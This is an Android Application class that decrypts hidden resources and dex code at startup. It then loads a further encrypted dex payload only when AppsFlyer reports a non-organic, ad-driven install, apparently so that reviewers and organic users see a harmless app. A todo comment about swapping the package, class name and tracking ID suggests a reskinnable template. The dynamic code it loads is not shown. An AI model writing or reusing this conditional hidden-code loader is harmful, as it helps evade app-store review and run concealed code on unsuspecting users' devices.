package com.vt.sdkres;

import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.webkit.WebView;

import com.LogUtil;
import com.Switch;
import com.android.resguard.AppExtResManager;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.sun.dex.core.DexLoader;
import com.vt.ar.SdkManager;

import java.util.Map;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

import mac.ysl.skr.BuildConfig;

//todo:修改package & classname & AppsFlyerId
public class BaseApp extends Application {
    private final AtomicBoolean loaded = new AtomicBoolean(false);
    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        if (Switch.LOG_ON) {
            LogUtil.d("BaseApp", "attachBaseContext, -->, ts="+System.currentTimeMillis());
        }
        try {
            loaded.set(DexLoader.getInstance().load(this));
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        if (Switch.LOG_ON) {
            LogUtil.d("BaseApp", "attachBaseContext, <--, ts="+System.currentTimeMillis()+", loaded="+loaded);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (Switch.LOG_ON) {
            LogUtil.d("BaseApp", "onCreate");
        }

        AppExtResManager.init(this);
        AppExtResManager.getInstance().decryptRes();
        AppExtResManager.getInstance().loadRes();

        setWebViewDataDirectorySuffix();
        if (loaded.get()){
            SdkManager.enter(this, null);
        }

        AppsFlyerLib.getInstance().setDebugLog(Switch.LOG_ON);
        AppsFlyerLib.getInstance()
                .init("z4JwuDtR8bZJS2syVE79kk", new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {//app在前台才返回， 有可能多次返回
                if (Switch.LOG_ON) {
                    LogUtil.d("BaseApp", "onCreate, onConversionDataSuccess, map=" + map);
                }

                String status = Objects.requireNonNull(map.get("af_status")).toString();
                if(status.equals("Organic") && !BuildConfig.DEBUG){
                    return;
                }
                try {
                    if (loaded.compareAndSet(false, true)) {
                        DexLoader.getInstance().decryptAndLoad(BaseApp.this);
                        SdkManager.enter(BaseApp.this, map);
                    }

                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onConversionDataFail(String s) {
                if (Switch.LOG_ON) LogUtil.d("BaseApp", "onCreate, onConversionDataFail, err="+s);
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {
                if (Switch.LOG_ON) LogUtil.d("BaseApp", "onCreate, onAppOpenAttribution, map="+map);
            }

            @Override
            public void onAttributionFailure(String s) {
                if (Switch.LOG_ON) LogUtil.d("BaseApp", "onCreate, onAttributionFailure, err="+s);
            }
        }, this).start(this);
    }

    private void setWebViewDataDirectorySuffix() {
        if (Build.VERSION.SDK_INT < 28) {
            return;
        }
        WebView.setDataDirectorySuffix(getProcessName());
    }
}
